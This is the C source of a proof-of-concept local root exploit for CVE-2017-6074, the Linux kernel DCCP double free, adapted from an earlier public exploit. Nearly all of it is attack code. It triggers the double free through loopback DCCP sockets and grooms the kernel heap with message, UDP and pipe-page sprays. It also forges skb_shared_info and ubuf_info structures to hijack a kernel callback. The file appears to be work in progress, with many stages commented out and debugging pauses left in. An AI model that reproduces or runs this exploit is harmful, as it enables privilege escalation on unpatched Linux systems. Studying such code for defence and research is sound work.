// A proof-of-concept local root exploit for CVE-2017-6074 manifesting ip control modified from 
// pwn.c by Andrey Konovalov <andreyknvl@gmail.com>
// Author: Lewis_Chen_

#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <sched.h>

#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>

#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <netinet/if_ether.h>

#include "libexp.h"
#include "libpagespray.c"
// modify this for other kernel versions
#define SHINFO_OFFSET		1728

#define KMALLOC_PAD 128
#define KMALLOC_WARM 32
// #define CATCH_FIRST 6
#define CATCH_FIRST 1
#define CRASH_IP 0xffffffffdeadbeef

// Port is incremented on each use.
static int port = 11000;

struct msg_spray_t *spray_list[1000];
int spray_cnt = 0;
char take_page_back_buffer[0x1000];

// * * * * * * * * * * * * * * Kernel structs * * * * * * * * * * * * * * * *

// modify this for other kernel versions
struct ubuf_info {
    uint64_t callback;      // void (*callback)(struct ubuf_info *, bool)
    uint64_t ctx;           // void *
    uint64_t desc;          // unsigned long
};

struct skb_shared_info {
    uint8_t  __unused;      // __u8
    uint8_t  meta_len;      // __u8
    uint8_t  nr_frags;      // __u8
    uint8_t  tx_flags;      // __u8
    uint16_t gso_size;      // unsigned short
    uint16_t gso_segs;      // unsigned short
    uint64_t frag_list;     // struct sk_buff *
    uint64_t hwtstamps;     // struct skb_shared_hwtstamps
    uint16_t gso_type;      // unsigned short
    uint32_t tskey;         // u32
    uint32_t ip6_frag_id;       // __be32
    uint32_t dataref;       // atomic_t
    uint64_t destructor_arg;    // void *
    uint8_t  frags[16][17];     // skb_frag_t frags[MAX_SKB_FRAGS];
};

struct ubuf_info ui;

void init_skb_buffer(char* buffer, void *func) {
	memset(buffer, 'A', 0x100);
	ui.callback = (unsigned long)func;

	struct skb_shared_info *ssi = (struct skb_shared_info *)&buffer[SHINFO_OFFSET];
	ssi->tx_flags = 0xff;
	ssi->destructor_arg = (uint64_t)&ui;
	ssi->nr_frags = 0;
	ssi->frag_list = 0;
}

// * * * * * * * * * * * * * * * Trigger * * * * * * * * * * * * * * * * * *

struct dccp_handle {
	struct sockaddr_in6 sa;
	int s1;
	int s2;
};

void dccp_init(struct dccp_handle *handle, int port) {
	handle->sa.sin6_family = AF_INET6;
	handle->sa.sin6_port = htons(port);
	inet_pton(AF_INET6, "::1", &handle->sa.sin6_addr);
	handle->sa.sin6_flowinfo = 0;
	handle->sa.sin6_scope_id = 0;

    // create the server socket
	handle->s1 = socket(PF_INET6, SOCK_DCCP, IPPROTO_IP);
	if (handle->s1 == -1) {
		perror("[-] fail to create the server socket");
		exit(EXIT_FAILURE);
	}
	int rv = bind(handle->s1, &handle->sa, sizeof(handle->sa));
	if (rv != 0) {
		perror("[-] fail to bind the server socket");
		exit(EXIT_FAILURE);
	}
	rv = listen(handle->s1, 0x9);
	if (rv != 0) {
		perror("[-] fail to listen the server socket");
		exit(EXIT_FAILURE);
	}

    // set np->rxopt.bits.rxinfo=True in dccp_v6_conn_request()
	int optval = 8;
	rv = setsockopt(handle->s1, IPPROTO_IPV6, IPV6_RECVPKTINFO,
			&optval, sizeof(optval));
	if (rv != 0) {
		perror("[-] fail to set the server socket");
		exit(EXIT_FAILURE);
	}

    // create the client socket
	handle->s2 = socket(PF_INET6, SOCK_DCCP, IPPROTO_IP);
	if (handle->s1 == -1) {
		perror("[-] fail to create the client socket");
		exit(EXIT_FAILURE);
	}
}

void dccp_kmalloc_kfree(struct dccp_handle *handle) {
    // connect to the server socket, free skb for the first time
	int rv = connect(handle->s2, &handle->sa, sizeof(handle->sa));
	if (rv != 0) {
		perror("[-] fail to connect to the server socket");
		exit(EXIT_FAILURE);
	}
}

void dccp_kfree_again(struct dccp_handle *handle) {
	int rv = shutdown(handle->s1, SHUT_RDWR);
	if (rv != 0) {
		perror("[-] fail the close the server socket");
		exit(EXIT_FAILURE);
	}
}

void dccp_destroy(struct dccp_handle *handle) {
	close(handle->s1);
	close(handle->s2);
}

// * * * * * * * * * * * * * * Heap spraying * * * * * * * * * * * * * * * * *

struct udp_fifo_handle {
	int fds[2];
};

void udp_fifo_init(struct udp_fifo_handle* handle) {
	int rv = socketpair(AF_LOCAL, SOCK_DGRAM, 0, handle->fds);
	if (rv != 0) {
		perror("[-] fail to create heap spraying sockets");
		exit(EXIT_FAILURE);
	}
}

void udp_fifo_destroy(struct udp_fifo_handle* handle) {
	close(handle->fds[0]);
	close(handle->fds[1]);
}

void udp_fifo_kmalloc(struct udp_fifo_handle* handle, char *buffer) {
	int rv = send(handle->fds[0], buffer, 1536, 0);
	if (rv != 1536) {
		perror("send()");
		exit(EXIT_FAILURE);
	}
}

void udp_fifo_kmalloc_small(struct udp_fifo_handle* handle) {
	char buffer[128];
	int rv = send(handle->fds[0], &buffer[0], 128, 0);
	if (rv != 128) {
		perror("send()");
		exit(EXIT_FAILURE);
	}
}

void udp_fifo_kfree(struct udp_fifo_handle* handle) {
  	char buffer[2048];
	int rv = recv(handle->fds[1], &buffer[0], 1536, 0);
	if (rv != 1536) {
		perror("recv()");
		exit(EXIT_FAILURE);
	}
}

void socket_sendmmsg(int sock, char *buffer) {
	struct mmsghdr msg[1];

	msg[0].msg_hdr.msg_iovlen = 0;

	// Buffer to kmalloc.
	msg[0].msg_hdr.msg_control = &buffer[0];
	msg[0].msg_hdr.msg_controllen = 2048;

	// Make sendmmsg exit easy with EINVAL.
	msg[0].msg_hdr.msg_name = "root";
	msg[0].msg_hdr.msg_namelen = 1;

	int rv = syscall(__NR_sendmmsg, sock, msg, 1, 0);
	if (rv == -1 && errno != EINVAL) {
		perror("[-] sendmmsg()");
		exit(EXIT_FAILURE);
	}
}

void sendmmsg_kmalloc_kfree(int port, char *buffer) {
	int sock[2];

	int rv = socketpair(AF_LOCAL, SOCK_DGRAM, 0, sock);
	if (rv != 0) {
		perror("[-] fail to create the malicous packet sockets");
		exit(EXIT_FAILURE);
	}

	socket_sendmmsg(sock[0], buffer); // msg is freed immediately, but who cares

	close(sock[0]);
}

// * * * * * * * * * * * * * * Heap warming * * * * * * * * * * * * * * * * *

void dccp_connect_pad(struct dccp_handle *handle, int port) {
	handle->sa.sin6_family = AF_INET6;
	handle->sa.sin6_port = htons(port);
	inet_pton(AF_INET6, "::1", &handle->sa.sin6_addr);
	handle->sa.sin6_flowinfo = 0;
	handle->sa.sin6_scope_id = 0;

	handle->s1 = socket(PF_INET6, SOCK_DCCP, IPPROTO_IP);
	if (handle->s1 == -1) {
		perror("socket(SOCK_DCCP)");
		exit(EXIT_FAILURE);
	}

	int rv = bind(handle->s1, &handle->sa, sizeof(handle->sa));
	if (rv != 0) {
		perror("bind()");
		exit(EXIT_FAILURE);
	}

	rv = listen(handle->s1, 0x9);
	if (rv != 0) {
		perror("listen()");
		exit(EXIT_FAILURE);
	}

	handle->s2 = socket(PF_INET6, SOCK_DCCP, IPPROTO_IP);
	if (handle->s1 == -1) {
		perror("socket(SOCK_DCCP)");
		exit(EXIT_FAILURE);
	}

	rv = connect(handle->s2, &handle->sa, sizeof(handle->sa));
	if (rv != 0) {
		perror("connect(SOCK_DCCP)");
		exit(EXIT_FAILURE);
	}
}

void dccp_kmalloc_pad() {
	int i;
	struct dccp_handle handle;
	for (i = 0; i < 4; i++) {
		dccp_connect_pad(&handle, port++);
	}
}

void timer_kmalloc_pad() {
	int i;
	for (i = 0; i < 4; i++) {
		socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
	}
}

void udp_kmalloc_pad() {
	int i, j;
	char dummy[2048];
	struct udp_fifo_handle uh[16];
	for (i = 0; i < KMALLOC_PAD / 16; i++) {
		udp_fifo_init(&uh[i]);
		for (j = 0; j < 16; j++)
			udp_fifo_kmalloc(&uh[i], &dummy[0]);
	}
}

void kmalloc_pad() {
	fprintf(stderr, "\t1. dccp kmalloc pad\n");
	dccp_kmalloc_pad();
	fprintf(stderr, "\t2. timer kmalloc pad\n");
	timer_kmalloc_pad();
	fprintf(stderr, "\t3. udp kmalloc pad\n");
	udp_kmalloc_pad();
}

void udp_kmalloc_warm() {
	int i, j;
	char dummy[2048];
	struct udp_fifo_handle uh[16];
	for (i = 0; i < KMALLOC_WARM / 16; i++) {
		udp_fifo_init(&uh[i]);
		for (j = 0; j < 16; j++)
			udp_fifo_kmalloc(&uh[i], &dummy[0]);
	}
	for (i = 0; i < KMALLOC_WARM / 16; i++) {
		for (j = 0; j < 16; j++)
			udp_fifo_kfree(&uh[i]);
	}
}

void kmalloc_warm() {
	udp_kmalloc_warm();
}

// * * * * * * * * * * * * * * * Hijacking * * * * * * * * * * * * * * * * *

void hijack() {
	//char dummy[2048];
	//memset(dummy, 'A', 2048);

	//fprintf(stderr, "[+] initialize malicious packets\n");
	//char buffer[2048];
	//init_skb_buffer(buffer, (void*)CRASH_IP);

	//fprintf(stderr, "[+] initialize heap spraying sockets\n");
	//struct udp_fifo_handle uh1, uh2, uh3;
	//udp_fifo_init(&uh1);
	//udp_fifo_init(&uh2);
	//udp_fifo_init(&uh3);

	//fprintf(stderr, "[+] warm up heap: \n");
	//kmalloc_pad();
	//kmalloc_warm();

	fprintf(stderr, "[+] initialize dccp sockets\n");
	struct dccp_handle dh;
	dccp_init(&dh, port++);

	fprintf(stderr, "[+] free the dccp skb->data for the 1st time\n");
	getchar();
	dccp_kmalloc_kfree(&dh);
	
	//nonsense();
	
	
	defragment(2048, 1);// fill a hole, *should be enable*
	//fprintf(stderr, "[+] spray heap for the 1st time\n");
	//udp_fifo_kmalloc(&uh2, dummy);
	

	//sleep(1);	
	//getchar();
	//fprintf(stderr, "[+] free the dccp skb->data for the 2nd time\n");
	//getchar();
	dccp_kfree_again(&dh);
	puts("[+] dccp_kfree_again() done");
	getchar();
	dccp_destroy(&dh);
	puts("[+] dccp_destroy() done");
	getchar();	
	//sleep(5);
	fprintf(stderr, "[+] free done\n");
	
	while(1) {
	sleep(999999);
	}
	puts("shouldn't achieve here");

	//nonsense();
	//getchar();

/*	
	fprintf(stderr, "[+] free the 1st spray and overwrite\n");
	msg_spray(&buffer[0x28], 0x800-0x30, 1);
	
	sleep(3);
	fprintf(stderr, "[+] free the 2nd spary and trigger\n");
	udp_fifo_kfree(&uh2);
*/	

	/*
	while(1) {
		sleep(99999999);
	}
	puts("shouldn't call");
	*/
}


void double_free() {
	fprintf(stderr, "[+] initialize dccp sockets\n");
	struct dccp_handle dh;
	getchar();
	dccp_init(&dh, port++);			// 	alloc from kmalloc-2048		slab_alloc_node()
	puts("dccp_init() done");
	//getchar();
	fprintf(stderr, "[+] free the dccp skb->data for the 1st time\n");
	//getchar();
	dccp_kmalloc_kfree(&dh);		//	free to kmalloc-2048
	
	defragment(2048, 1);// fill a hole, *should be enable*
	puts("[+] defrag done!");
	//getchar();
	//dccp_kfree_again(&dh);
	//puts("[+] dccp_kfree_again() done");
	
	getchar();
	dccp_destroy(&dh);			//	double free to kmalloc-2048
	puts("[+] dccp_destroy() done");
	fprintf(stderr, "[+] free done\n");
	
	while(1) {
	sleep(999999);
	}
	puts("shouldn't achieve here");


}
/*
struct dccp_handle dh;
void put_obj_kmalloc_2048() {
	dccp_init(&dh, port++);
	puts("[+] put obj done");
}
*/


void page_fengshui_warmup() {
	defragment(0x600, 0x400);
	puts("[+] page warm up");
}

void page_level_warm_up(){
	prep();
	stage_1_iovec_spray();
	stage_2_iovec_spray();
	free_all_iovec();
	cleanup();
	puts("[+] warm up done");
}


int get_cpu_id(int argc, char **argv)
{
	if(argc < 2) return 0;
	int run_time = atoi(argv[1]);
	return run_time % cpu_num;
}

int main(int argc, char **argv) {
	set_cpu(get_cpu_id(argc, argv));

    char fake_ops[0x1000];
	memset(fake_ops,0x41,0x1000);
	unsigned long take_page_back_buffer[0x1000/8];
	for (int i=0;i<0x1000/8;i++) {
		take_page_back_buffer[i] = (unsigned long)fake_ops;
	}
	
	for(int i=0; i<10; i++) {
		printf("i: %d\n", i);
		puts("-------------------------");
		
		//page_fengshui_warmup();
		//page_level_warm_up();
		struct msg_spray_t *warmup = msg_spray(NULL, 0x600 - 0x30, 0x1000);
		msg_spray_clean(warmup);
		
		prep();
		
		//stage_1_iovec_spray();		// iovec, allocate many slab pages put iovecs in the pages
		spray_list[spray_cnt++] = msg_spray(NULL, 0x600 - 0x30, 0x200);

		put_vuln_obj();			// vuln obj
	
		struct dccp_handle dh;
		dccp_init(&dh,11000);

		spray_list[spray_cnt++] = msg_spray(NULL, 0x600 - 0x30, 0x200);

		//usleep(10000);

		dccp_kmalloc_kfree(&dh);	// double obj
		defragment(2048,1);
		dccp_kfree_again(&dh);
		//stage_2_iovec_spray();		// iovec	
		//dccp_destroy(&dh);
		//free_all_iovec();
		// for (int i = 0; i < spray_cnt; i++) {
		// 	msg_spray_clean(spray_list[i]);
		// }
		// spray_cnt = 0;
		msg_spray_clean(spray_list[0]);
		msg_spray_clean(spray_list[1]);
		spray_cnt = 0;

		//page_spray();
		for (int i = 0x0 ; i < PIPE_PAGE_NUM; i++) {
        	write(pipe_pages[i][1], take_page_back_buffer, 0x1000);
        	usleep(100);
    	}

		read(exp_pipes[0], take_page_back_buffer, 0x100);

		for (unsigned long i = 0; i < PIPE_PAGE_NUM; i++) {
			close(pipe_pages[i][0]);
			close(pipe_pages[i][1]);
		}
		close(exp_pipes[0]);
		close(exp_pipes[1]);

		dccp_destroy(&dh);
	}	
	return 0;
}
